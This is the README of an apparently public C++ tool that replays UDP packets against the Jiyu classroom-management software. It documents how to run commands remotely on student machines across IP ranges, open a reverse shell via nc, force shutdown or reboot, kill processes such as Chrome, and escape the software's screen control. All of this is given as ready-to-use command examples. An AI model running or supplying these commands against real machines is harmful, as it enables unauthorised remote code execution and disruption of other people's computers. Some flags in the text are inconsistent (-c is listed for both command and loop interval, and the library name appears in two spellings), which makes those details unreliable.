# Jiyu-UDP-Attack-Cpp
A UDP replay attack code for Jiyu, written in C++.

中文文档见 [README_zh.md](https://github.com/pbw-Kevin/Jiyu-UDP-Attack-Cpp/blob/main/README_zh.md)

## Compile
Required C++ version: C++14

Compile command:

### MSVC
```bash
cl main.cpp /std:c++14 /Fe:main.exe
```

### GCC / MinGW (On Windows)
```bash
g++ main.cpp -o main.exe -std=c++14 -lws2_32
```

### GCC / MinGW (On Linux)
```bash
g++ main.cpp -o main -std=c++14
```

Note when using GCC / MinGW compiler on Windows:  
Make sure Windows-related library is in the library directory.  
Do not forget the compile argument `-lws_32`. If not using command line, add this argument to the compile options in your IDE.

## Usage
Start UI by simply run the program or call:
```bash
main
```

Or, run on command line:
```bash
main [-h(--help) |
  [-ip <IP>] [-p <Port>] [-msg <Message> | -c <Command>]
  [-l <Loop Count>] [-t <Loop Time Interval>]
  [-e <Extra Option>] [-ncport <NC Port>]]
```

Arguments:
| Argument | Description | Default |
| -------- | ----------- | ------- |
| `-h(--help)` | Show help text. | |
| `-ip <IP>` | Specify the IP of target. | |
| `-p <Port>` | Specify which port to listen to. | 4705 |
| `-msg <Message>` | Specify the message to send. | |
| `-c <Command>` | Command to run on target machine. | |
| `-e <Extra Option>` | Load extra option. | |
| `-l <Loop Count>` | Specify the loop count of the command. | 1
| `-c <Loop Time Interval>` | Specify the loop's interval time of the command, in seconds. | 22 |
| `-ncport <NC Port>` | Specify which port for `nc` command to listen to. | 8888 |

Available options for `<Extra Option>` of `-e` argument:
| Option | Description |
| ------ | ----------- |
| `r` | Reboot the target machine. |
| `s` | Shutdown the target machine. |
| `g` | Get your current IP address and the port which Student Terminal listens to. |
| `nc` | Reverse shell. Needs Internet access on target machine. Use command `exit` to exit. |
| `break` | Get out of screen control. Needs administrator access. |
| `continue` | Recover screen control. |

Target IP available for `<IP>` of `-ip` argument:
- A direct IP. eg. `192.168.1.1`
- An IP segment, ends with `/24`. eg. `192.168.1.1/24`
- An IP segment, represented by `-`. eg. `192.168.1.2-10`  
Note:  
Only the last number of an IP is availble to be a segment.  
This is illegal: `192.168.1-80.1`

### Examples
1. Get your IP address and the port which Student Terminal listens to:

```bash  
main -e g
```

2. Get out of screen control:

Needs administrator access, mainly for MpsSvc.
```bash
main -e break
```

3. Recover screen control:

```bash
main -e continue
```

4. Send message:

Send a piece of message "Hello!" to target machine with IP `192.168.1.1`:
```bash
main -ip 192.168.1.1 -msg "Hello!"
```

If the port which Student Terminal listens to is **4605**, use `-p <Port>` to specify the port. Send a piece of message "Hello!" to target machine with IP `192.168.1.12`:
```bash
main -ip 192.168.1.12 -p 4605 -msg "Hello!"
```

5. Run command:

Pop up a calculator for target machines with ip `192.168.1.12` to `192.168.1.137`:
```bash
main -ip 192.168.1.12-137 -c calc.exe
```

If the command to run has space in it, use a pair of quote to wrap:
```bash
main -ip 192.168.1.1 -c "taskkill /f /im chrome.exe"
```

6. Reverse shell:

The ip of target machine should **not** be a segment.
```bash
main -ip 192.168.1.1 -e nc
```

7. Shutdown and reboot:

Shutdown:
```bash
main 192.168.1.1 -e s
```

Reboot:
```bash
main 192.168.1.1 -e r
```

8. Loop command:

Send message to target machines with IP `192.168.1.0` to `192.168.1.255`, continue to execute after 50s, totally 3 times:
```bash
main -ip 192.168.1.1/24 -msg "hello,baby!" -l 3 -t 50
```

## About
Inspired by: [ht0Ruial/Jiyu_udp_attack](https://github.com/ht0Ruial/Jiyu_udp_attack)

## License
[MIT License](https://github.com/pbw-Kevin/Jiyu-UDP-Attack-Cpp/blob/main/LICENSE)
